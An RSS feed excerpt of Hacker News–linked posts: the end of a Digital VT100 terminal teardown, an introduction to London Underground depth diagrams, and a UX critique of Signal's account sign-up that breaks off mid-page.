<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288.jpg" alt="Digital VT100 - keyboard pcb" width="1080" height="491" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288-300x136.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288-1024x466.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/keyboard_pcb-7288-624x284.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The next picture shows the detail of the key.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290.jpg" alt="Digital VT100 - key detail" width="1080" height="420" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290-300x117.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290-1024x398.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-key_detail_7290-624x243.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>There was no need for a “keycap puller”, the keys came off easily – so easily that I was lucky that no key was lost in all these years. This image is taken from the technical manual I found on the net.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png" alt="Digital VT100 - key exploded view" width="800" height="997" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png 800w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-300x374.png 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-241x300.png 241w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-624x778.png 624w" sizes="(max-width: 800px) 100vw, 800px"></a></p>
<p>After the keyboard I cleaned the main unit. The “Lunar” badge was probably&nbsp;added by the seller or the distributor, but I couldn’t find any information about it. Under the badge you can see the original colour of the case. If you look closely, you can see that the CRT monitor has a ghost image caused by showing the same static text many hours a day for years.&nbsp;Here’s the teardown picture.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg" alt="Digital VT100 - teardown" width="1248" height="5816" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-300x1398.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-220x1024.jpg 220w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-624x2908.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>There’s a sticker under the keyboard, used to keep track of the terminal settings. In the setup screen that you can see in the first picture there are 4 series of 4 bits: each one sets an option, explained in the manual and summed up on the sticker.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png" alt="Digital VT100 - setup" width="1248" height="593" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-300x143.png 300w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-1024x487.png 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-624x297.png 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>The unit was designed with easy reparability in mind. The top and bottom case are kept together with just four clips; a few other clips keep the main unit attached to the bottom case.</p>
<p>The motherboard and the graphic board can be pulled out by unscrewing a panel on the back.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg" alt="Digital VT100 - back" width="1248" height="858" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-300x206.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-1024x704.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-624x429.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>The power supply unit can be pulled from the main by lifting –&nbsp;you’ve already guessed – some clips.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330.jpg" alt="Digital VT100 - power supply unit - insertion" width="1080" height="817" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330-300x227.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330-1024x775.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-insertion-7330-624x472.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The power supply unit:</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307.jpg" alt="Digital VT100 - power supply unit" width="1080" height="817" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307-300x227.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307-1024x775.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-power_supply_unit-7307-624x472.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The main processor is an Intel 8080.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327.jpg" alt="Digital VT100 - motherboard" width="1080" height="1039" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327-300x289.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327-1024x985.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-motherboard-7327-624x600.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The Selanar Graphics 100 is an additional third party board that lets the terminal show&nbsp;132 columns on screen and use advanced character formatting. It’s based on an Intel 8085 processor.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324.jpg" alt="Digital VT100 - Selanar Graphics 100" width="1080" height="1004" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324-300x279.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324-1024x952.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-selanar_graphics_100-7324-624x580.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The side view of the terminal:</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362.jpg" alt="Digital VT100 - side" width="1248" height="866" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362-300x208.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362-1024x711.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-side-7362-624x433.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>You can immediately recognize the VT100 on the manual cover:</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-technical_manual.png"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-technical_manual.png" alt="Digital VT100 - technical manual" width="312" height="431" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-technical_manual.png 624w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-technical_manual-300x414.png 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-technical_manual-217x300.png 217w" sizes="(max-width: 312px) 100vw, 312px"></a></p>
<p>The most useful site I found about the VT100 is <a href="http://vt100.net/">VT100.net</a>; you can find the technical manual on the <a href="https://archive.org/details/bitsavers_decterminaT100TechnicalManualJul82_24218672">Internet Archive</a>. The only information about the Selanar Graphics 100 came from a Google Book scan of <a href="https://books.google.it/books?id=I_GaHXKwFpMC&amp;lpg=PA48&amp;pg=PA48#v=onepage&amp;q&amp;f=false">Computerword magazine</a> from August 1980. It cost $1195, and on the same page there’s an ad for the VT100 at $1550. That makes a total of $2745, that according to&nbsp;<a href="http://www.usinflationcalculator.com/">usinflationcalculator.com</a>&nbsp;corresponds to $7926 in 2015. For a terminal!</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342.jpg" alt="Digital VT100" width="1080" height="670" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342-300x186.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342-1024x635.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-7342-624x387.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
					</div></div>]]>
            </description>
            <link>https://www.oldcomputr.com/digital-vt100-1978/#more-703</link>
            <guid isPermaLink="false">hacker-news-small-sites-25831695</guid>
            <pubDate>Tue, 19 Jan 2021 09:51:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Down Underground: London Underground depth diagrams]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25831636">thread link</a>) | @fanf2
<br/>
January 19, 2021 | https://www.dansilva.co.uk/down-underground | <a href="https://web.archive.org/web/*/https://www.dansilva.co.uk/down-underground">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-3d440196438b8c552ee9"><div><p>One day, on my commute to work, I wondered – "How deep underground am I?" Escalators, stairs, lifts, mazes of tunnels… no idea. I searched the internet – a few people have done curiosity maps and played with Beck's design, so surely one of depths must exist. Trawling the internet, seeking to satiate my curiosity, I found nothing. So my curiosity turned into a mission – I would create these. I set on to research and got an excel sheet from TfL.</p><p>Taking a page from Beck's book, I couldn't represent distances between stations to scale, as that would have render most diagrams impractical. The only accurate scale would be that of depth. I  created the first diagram – the Victoria line, one of the simplest. Once I got on to the Central line I realised my approach had to change – some lines have different branches, and as the diagrams represent a unique path, I couldn't create a single diagram for the whole line.</p></div></div></div><div><div data-block-type="2" id="block-1248e73b2db85bb3239a"><div><p>The obvious solution at the time, it seemed, was for me to choose, within each specific Underground line, the minimal number of A-B journeys that would cover all of its stations. Creating the diagrams was time-consuming. So many numbers and calculations, double- and triple-checking. Once the diagrams were completed they didn't seem right – yes, I knew all the depths of the stations, but the way I'd displayed them didn't seem correct.</p><p>The answer arrived via the Circle, District and Hammersmith &amp; City lines. These have so many different branches that you need to be certain of which service you get. And this was when the obvious dawned on me. Sure, lines branch out, but trains go from A-B. What the diagrams had to represent was not the lines but the services of these lines. So I checked all the services from all the lines (33 in total) and re-created the diagrams accordingly.</p></div></div></div></div>]]>
            </description>
            <link>https://www.dansilva.co.uk/down-underground</link>
            <guid isPermaLink="false">hacker-news-small-sites-25831636</guid>
            <pubDate>Tue, 19 Jan 2021 09:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating a Signal account]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 99 (<a href="https://news.ycombinator.com/item?id=25831509">thread link</a>) | @Signalvwhatsapp
<br/>
January 19, 2021 | https://builtformars.com/creating-an-account-with-signal/ | <a href="https://web.archive.org/web/*/https://builtformars.com/creating-an-account-with-signal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-id="ca3ca43" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">

<div>
<div>
<div data-id="ec20c55" data-element_type="column">
<div>
<div>
<div data-id="682e138" data-element_type="widget" data-widget_type="theme-post-content.default">
<div>
<div data-elementor-type="wp-post" data-elementor-id="10980" data-elementor-settings="[]">
<div>
<div>
<section data-id="ac8bea9" data-element_type="section">
<div>
<div>
<div data-id="2dc6840" data-element_type="column">
<div>
<div>
<div data-id="da969ab" data-element_type="widget" data-settings="{&quot;drop_cap&quot;:&quot;yes&quot;}" data-widget_type="text-editor.default">
<div>
<p>Elon Musk, Jack Dorsey and Edward Snowden are just 3 of the influential advocates for Signal—a messaging app that’s like WhatsApp, but with more of a focus on privacy.</p>
</div>
</div>
<div data-id="b34b288" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>And when WhatsApp announced changes to their data-sharing policy, Signal exploded.</p>
</div>
</div>
<div data-id="3f0d7d8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>But this rapid growth has introduced a UX complexity: the app is now being used by a much broader group of people.</p>
</div>
</div>
<div data-id="0d4a615" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Signal <em>may</em> be more private than WhatsApp, but if they ever want to rival their 2 billion users (yes, you read that correctly), then they’ll need a product that’s <strong>just as easy to use</strong>.</p>
</div>
</div>
<div data-id="7066953" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>The golden question is this: when the hype dies, will people be able to convince their lazy friends, who don’t care about internet privacy, to sign up?</p>
</div>
</div>
<div data-id="6777d1b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>The answer to that depends on a number of factors, one being how easy the experience of migrating from WhatsApp to Signal is. So let’s take a look.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="d2dcdb3" data-element_type="section">
<div>
<div>
<div data-id="46038e3" data-element_type="column">
<div>
<div>
<div data-id="53524d8" data-element_type="widget" data-widget_type="heading.default">
<p>
<h3>In this case study you'll learn:</h3> </p>
</div>
<section data-id="03f5b82" data-element_type="section">
<div>
<div>

<div data-id="9388fcb" data-element_type="column">
<div>
<div>
<div data-id="f4e58e8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Some Harry Potter UX magic.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="161ddae" data-element_type="section">
<div>
<div>

<div data-id="5b27052" data-element_type="column">
<div>
<div>
<div data-id="2b9a408" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>How Signal could improve their PIN creation process.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="e4d389f" data-element_type="section">
<div>
<div>

<div data-id="f314618" data-element_type="column">
<div>
<div>
<div data-id="1710ffa" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>What a ‘beautiful error’ looks like.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="9c32fbb" data-element_type="section">

</section>
<section data-id="a159848" data-element_type="section">
<div>
<div>

<div data-id="5c06ef5" data-element_type="column">
<div>
<div>
<div data-id="8dcab29" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Why friction may be tethering referrals.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="698b1d9" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div>
<div>
<div data-id="dce49b3" data-element_type="column">
<div>
<div>

<div data-id="3a4610d" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>💡<strong>Tip:</strong> Swipe<span>&nbsp;to navigate the slides.</span></p>
</div>
</div>
<div data-id="155d994" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>💡<strong>Tip:</strong> Try using the ⬅️ <span>➡️ arrows on your keyboard to navigate the slides.</span></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="1a25068" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
<div>
<div>
<div data-id="4974a83" data-element_type="column">
<div>
<div>
<div data-id="665ca46" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div>
<div><div role="region" aria-label="Slider"><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNzIwIiA+PC9zdmc+" alt="Slider"></p></div></div>


</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="c3eb940" data-element_type="section">

</section>
<section data-id="cb200c3" data-element_type="section">
<div>
<div>
<div data-id="a5e22b9" data-element_type="column">
<div>
<div>
<div data-id="83342bd" data-element_type="widget" data-widget_type="heading.default">
<p>
<h3>1. Contexto patronum (🧙⚡️)</h3> </p>
</div>
<div data-id="5f34b3d" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Context is essentially UX wizardry.</p>
</div>
</div>
<div data-id="57a2c0c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>It converts confusing and awkward tasks into things that people do on autopilot, without hesitation. For example, imagine if someone asked for a copy of your passport:</p>
</div>
</div>
<div data-id="6130da2" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="1200" height="574" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal.jpg 1200w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal-300x144.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal-1024x490.jpg 1024w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal-768x367.jpg 768w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal-100x48.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/Context-Passport-Signal-700x335.jpg 700w" sizes="(max-width: 1200px) 100vw, 1200px"> </p>
</div>
</div>
<div data-id="3130dce" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>With that in mind, it’s ironic that an app which so heavily forces the conversation of privacy, also asks for access to sensitive information <strong>entirely out of context</strong>, twice, during the account creation process.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="53cbbcd" data-element_type="section">
<div>
<div>
<div data-id="1573452" data-element_type="column">
<div>
<div>
<section data-id="4b8ab81" data-element_type="section">
<div>
<div>

<div data-id="d2852c5" data-element_type="column">
<div>
<div>
<div data-id="7d1dd88" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>💡&nbsp;Missing context (i.e., when to ask)</strong></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="2a407d0" data-element_type="section">
<div>
<div>
<div data-id="e8f5cb7" data-element_type="column">
<div>
<div>
<div data-id="d511b02" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><strong>Access to all of your contacts.</strong></p>
<p>This is the first thing you’re asked for, before even providing your name.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="2868542" data-element_type="column">
<div>
<div>
<div data-id="f5f32a1" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>When you try to start a new conversation, prompt the user that they can find other Signal users from your contacts.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="c931062" data-element_type="section">
<div>
<div>
<div data-id="2945ee2" data-element_type="column">
<div>
<div>
<div data-id="02e2e3c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><strong>Access to other devices in your house.</strong></p>
<p>This is asked immediately after creating an account, with no real explanation why.</p></div>
</div>
</div>
</div>
</div>
</div>
<div data-id="703becb" data-element_type="column">
<div>
<div>
<div data-id="5654444" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>When the user is trying to transfer their Signal account to another device, prompt the user to search for nearby devices.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="1d5a6b6" data-element_type="section">
<div>
<div>
<div data-id="632e3b7" data-element_type="column">
<div>
<div>
<div data-id="3be08e8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Here are a few questions to ask yourself while designing permissions modals:</p>
</div>
</div>
<div data-id="9d3a764" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>1: </b>Is it obvious <strong>why</strong> this information is required? (i.e., is the benefit specific).</p>
</div>
</div>
<div data-id="d6d663f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>2: </b>Is the user <strong>currently</strong> trying to do a task that would benefit from this?</p>
</div>
</div>
<div data-id="43979bc" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>In Signal’s case, the answer to both of those is no.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="a352fb8" data-element_type="section">
<div>
<div>
<div data-id="cebd6a1" data-element_type="column">
<div>
<div>

<div data-id="75b1735" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>I often find myself repeating the following: <em>if you’re asking the user to set a password, tell them all the password rules</em>.</p>
</div>
</div>
<div data-id="d9b2a4b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>At this point it’s a well-versed ‘Built for Mars sin’. But there’s a more frustrating version of this: failing a password rule, and <strong>still not being told what the rule was</strong>.</p>
</div>
</div>
<div data-id="f24099f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>And frustratingly, this is what Signal do while setting a PIN number.</p>
</div>
</div>
<div data-id="db57724" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="720" height="259" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/StringerPin.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/StringerPin.jpg 755w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/StringerPin-300x108.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/StringerPin-100x36.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/StringerPin-700x252.jpg 700w" sizes="(max-width: 720px) 100vw, 720px"> </p>
</div>
</div>
<div data-id="70dfa08" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>That’s it, that’s literally all you’re given, which is problematic for a few reasons:</p>
</div>
</div>
<div data-id="44d24d6" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>1:&nbsp;</b>What makes a PIN code <em>stronger</em>?</p>
</div>
</div>
<div data-id="f3112dd" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>2: </b>How <em>much</em> stronger does my PIN code have to be?&nbsp;</p>
</div>
</div>
<div data-id="f029286" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>But if we step backwards for a moment, you can see why this may not have been a problem up until now. Those who were motivated to sign up to Signal presumably had an interest in internet privacy, and probably also had at least a basic understanding of what makes a strong password.&nbsp;</p>
</div>
</div>
<div data-id="bf0f0d0" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>But as people migrate from WhatsApp to Signal, their ‘average user’ has changed. And what’s there today is no longer self-explanatory.&nbsp;</p>
<p>…</p></div>
</div>
</div>
<div data-id="307720f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>There are a few ways that they could tackle this:</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="af2dabe" data-element_type="section">
<div>
<div>
<div data-id="be1f603" data-element_type="column">
<div>
<div>
<section data-id="216b686" data-element_type="section">
<div>
<div>

<div data-id="969ba02" data-element_type="column">
<div>
<div>
<div data-id="ca0f596" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><strong>1. Teach the user more generally about passwords</strong></p>
<p>i.e., a link to learn more about what makes a password ‘strong’.</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="24db5cf" data-element_type="section">
<div>
<div>

<div data-id="5e9e38b" data-element_type="column">
<div>
<div>
<div data-id="2dc5725" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><b>2. List specific rules</b></p>
<p>i.e., “must not be a series of the same digit 4 times”.</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="60de5e2" data-element_type="section">
<div>
<div>

<div data-id="6891342" data-element_type="column">
<div>
<div>
<div data-id="360ed15" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><b>3. Show tips for a strong password</b></p>
<p>i.e., “you can make this password more secure by using up to 6 digits”.</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="bade7a3" data-element_type="section">
<div>
<div>
<div data-id="4416c2a" data-element_type="column">
<div>
<div>

<div data-id="ec602c7" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>And after that validation issue, I submitted a new PIN and… Signal errored. I later found out <span><a href="https://twitter.com/signalapp/status/1350118809860886528?s=20" target="_blank" rel="noopener">via Twitter</a></span> that the flood of new users may have been the cause of the problem.</p>
</div>
</div>
<div data-id="00fc8ed" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="720" height="351" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-1024x499.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-1024x499.jpg 1024w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-300x146.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-768x374.jpg 768w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-100x49.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed-700x341.jpg 700w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailed.jpg 1125w" sizes="(max-width: 720px) 100vw, 720px"> </p>
</div>
</div>
<div data-id="fdf76e1" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>But I’m not even mad, because <em>this</em> error handling was beautiful.</p>
<p>…</p></div>
</div>
</div>
<div data-id="53dc6f6" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>To understand why, let’s dissect it into 4 parts.</p>
</div>
</div>
<div data-id="7f38fa6" data-element_type="widget" data-widget_type="image.default">
<div>
